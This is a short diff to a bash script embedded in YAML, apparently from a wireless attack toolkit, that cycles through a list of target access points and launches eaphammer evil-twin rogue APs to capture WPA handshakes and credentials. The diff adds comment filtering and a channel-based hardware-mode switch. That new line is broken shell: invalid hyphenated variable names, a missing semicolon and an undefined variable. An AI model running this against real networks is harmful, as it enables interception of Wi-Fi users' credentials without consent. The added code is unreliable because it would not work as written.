@@ -51,7 +51,6 @@ script: |-
   filenotfound=false;
   for file in #list#; do test -e $file || { filenotfound=true; echo -e "\e[1;91m[error] File $file not exist\e[0m"; }; done;
   if $filenotfound; then exit; fi;
-  # cat #list# | sort -u | sort -R > temp.etwin-targets.txt;
 
   # Функции
   stop_mon_screen() { sudo screen -S pulsar-monitor-proc -X stuff '^C'; };
@@ -60,7 +59,7 @@ script: |-
   mkdir -p $outdir;
   while true; do
     IFS=$'\n';
-    for ap in $(cat #list# | sort -u | sort -R); do
+    for ap in $(cat #list# | sort -u | sort -R | grep -v -e '^;'); do
       # Параметры
       essid=$(echo $ap | awk -F ';' '{print $1}');
       bssid=$(echo $ap | awk -F ';' '{print $2}');
@@ -87,7 +86,8 @@ script: |-
       sudo iw $interface set type managed;
       sudo ip link set $interface up;
       sudo nmcli dev set $interface managed yes;
-      sudo timeout -s INT -k 20s #timeout# eaphammer --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
+      if [[ "$chn" -le "14" ]]; then hw-mode=g; elif [[ -n "$chn" ]] then hw-mode=a; else hw-mode=g; fi;
+      sudo timeout -s INT -k 20s #timeout# eaphammer --hw-mode "$hw-mode" --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
       
       # Выход
       stop_mon_screen; sleep 1;
@@ -102,5 +102,4 @@ script: |-
     done;
     IFS=$OLDIFS;
   done;
-  # rm -f ./temp.etwin-targets.txt
   
